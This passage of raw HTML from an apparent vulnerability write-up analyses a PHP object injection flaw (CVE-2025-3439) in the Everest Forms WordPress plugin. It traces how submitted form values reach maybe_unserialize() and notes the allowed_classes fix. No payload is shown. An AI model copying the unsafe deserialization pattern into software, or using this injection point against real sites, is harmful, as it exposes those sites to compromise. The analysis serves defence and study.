class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using &lt;code&gt;unserialize()&lt;/code&gt; with &lt;code&gt;&#39;allowed_classes&#39;&amp;ensp;=&amp;gt;&amp;ensp;false&lt;/code&gt; completely removes the ability to instantiate objects, effectively eliminating the vulnerability.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a submenu &lt;code&gt;Entries&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_submenu_page&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;everest-forms&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Everest&amp;ensp;Forms&amp;ensp;Entries&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;everest-forms&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Entries&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;everest-forms&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;everest_forms_view_entries&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;everest_forms_view_entries&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;everest_forms_view_others_entries&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;evf-entries&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;entries_page&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Callback &lt;code&gt;entries_page&lt;/code&gt; is executed when accessing this submenu:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;entries_page&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;EVF_Admin_Entries&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;page_output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function calls &lt;code&gt;page_output()&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;page_output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;everest_forms_entries_list_actions&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;do_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;everest_forms_entries_list_actions_execute&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view-entry&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;phpcs:ignore&amp;ensp;WordPress.Security.NonceVerification&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;views/html-admin-page-entries-view.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;table_list_output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When &lt;code&gt;$_GET[&#39;view-entry&#39;]&lt;/code&gt; exists, the view &lt;code&gt;html-admin-page-entries-view.php&lt;/code&gt; is included.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/entries.png&#34; title=&#34;Entries Page&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/entries.png&#34; data-sub-html=&#34;&lt;h2&gt;Entries&lt;/h2&gt;&lt;p&gt;Entries Page&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/entries.png&#39; alt=&#34;Entries&#34; height=&#34;998&#34; width=&#34;1231&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Entries Page&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This page displays all submitted form input.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$entry_meta&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;everest_forms_entry_single_data&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$entry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$form_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$entry_meta&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_serialized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_strip_all_tags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;evf_is_json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;everest_forms_html_field_value&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$entry_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$meta_key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$entry_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;entry-single&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_serialized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$field_value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$entry_meta&lt;/code&gt; represents user-submitted form data. Each item contains a &lt;code&gt;meta_key&lt;/code&gt; and a &lt;code&gt;meta_value&lt;/code&gt;, and the system loops through them:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;If the value is JSON&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;evf_is_json()&lt;/code&gt; determines whether the string is valid JSON.&lt;/li&gt;&#xA;&lt;li&gt;If yes, &lt;code&gt;json_decode()&lt;/code&gt; extracts the decoded content via &lt;code&gt;$meta_value[&#39;value&#39;]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Then &lt;code&gt;$field_value&lt;/code&gt; is generated&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Passed through the filter &lt;code&gt;everest_forms_html_field_value&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;If serialized&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; is used to decode it â€” this is the security flaw.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre 